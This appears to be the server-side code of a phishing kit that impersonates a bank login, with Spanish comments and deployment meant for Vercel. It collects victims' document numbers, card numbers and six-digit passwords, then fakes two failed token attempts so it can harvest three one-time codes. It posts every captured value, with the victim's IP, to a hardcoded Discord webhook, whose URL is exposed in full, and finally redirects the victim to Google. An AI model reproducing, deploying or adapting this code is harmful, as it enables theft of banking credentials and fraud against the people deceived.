// CONFIGURACIÓN DE DISCORD (Coloca aquí tu URL entre las comillas)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1420828814472118436/ZpvZ6PufGc7mnpz9kOlWIgUOb0AwuR2vNLWBgumC-aHmW92O0q1k50HFVjpi7plZG0FR';

// Objeto temporal en memoria para simular las sesiones de los usuarios por IP
// (Vercel Serverless es estático, por lo que rastreamos los intentos mediante la IP)
const poolIntentos = {};

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.redirect(302, '/index.html');
    }

    // Obtener la IP real del visitante en Vercel
    const ipUser = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP Desconocida';
    const cleanIP = ipUser.split(',')[0].trim();

    const { paso, tipo, tipoDocumento, nroDocumento, tarjeta, clave, token } = req.body;

    // ==========================================
    // PASO 1: Captura de Credenciales de Ingreso
    // ==========================================
    if (paso === 'login') {
        // Inicializar o reiniciar los intentos para esta IP
        poolIntentos[cleanIP] = 0;

        const mensaje = "```md\n" +
            "🔔 NUEVO LOGIN DETECTADO (VERCEL)\n" +
            "================================\n" +
            `[Tipo Banca]:   ${tipo || 'Persona'}\n` +
            `[Documento]:    ${tipoDocumento || 'DNI'} - ${nroDocumento || ''}\n` +
            `[Tarjeta]:      ${tarjeta || ''}\n` +
            `[Clave 6D]:     ${clave || ''}\n` +
            "================================\n" +
            `[IP Usuario]:   ${cleanIP}\n` +
            "```";

        await enviarDiscord(mensaje);
        
        // Va a la pantalla de carga inicial indicando origen
        return res.redirect(302, '/loading.html?origen=login');
    }

    // ==========================================
    // PASO 2: Bucle de Control (3 Intentos de Token)
    // ==========================================
    if (paso === 'token') {
        // Si no existe registro previo de la IP, asumimos que es el primer intento
        if (poolIntentos[cleanIP] === undefined) {
            poolIntentos[cleanIP] = 0;
        }

        poolIntentos[cleanIP]++;
        const intentoActual = poolIntentos[cleanIP];

        if (intentoActual === 1) {
            const mensaje = "```md\n" +
                "❌ PRIMER TOKEN (Intento 1)\n" +
                "================================\n" +
                `[Token 1]:       ${token || ''}\n` +
                "================================\n" +
                `[IP Usuario]:    ${cleanIP}\n" +
                "```";

            await enviarDiscord(mensaje);
            return res.redirect(302, '/loading.html?origen=error');

        } else if (intentoActual === 2) {
            const mensaje = "```md\n" +
                "❌ SEGUNDO TOKEN (Intento 2)\n" +
                "================================\n" +
                `[Token 2]:       ${token || ''}\n` +
                "================================\n" +
                `[IP Usuario]:    ${cleanIP}\n` +
                "```";

            await enviarDiscord(mensaje);
            return res.redirect(302, '/loading.html?origen=error');

        } else {
            const mensaje = "```md\n" +
                "✅ TERCER TOKEN (Intento 3 - Final)\n" +
                "================================\n" +
                `[Token 3]:       ${token || ''}\n` +
                "================================\n" +
                `[IP Usuario]:    ${cleanIP}\n` +
                "```";

            await enviarDiscord(mensaje);
            
            // Limpiar el contador para liberar espacio de memoria
            delete poolIntentos[cleanIP];

            // Redirección externa definitiva al terminar los 3 ciclos
            return res.redirect(302, 'https://www.google.com');
        }
    }

    return res.redirect(302, '/index.html');
}

// Función auxiliar para enviar datos al Webhook de Discord
async function enviarDiscord(mensaje) {
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: mensaje,
                username: "🚨 Sistema de Alertas Vercel",
                avatar_url: "https://i.imgur.com/wSTFkRM.png"
            })
        });
    } catch (error) {
        console.error('Error enviando a Discord:', error);
    }
}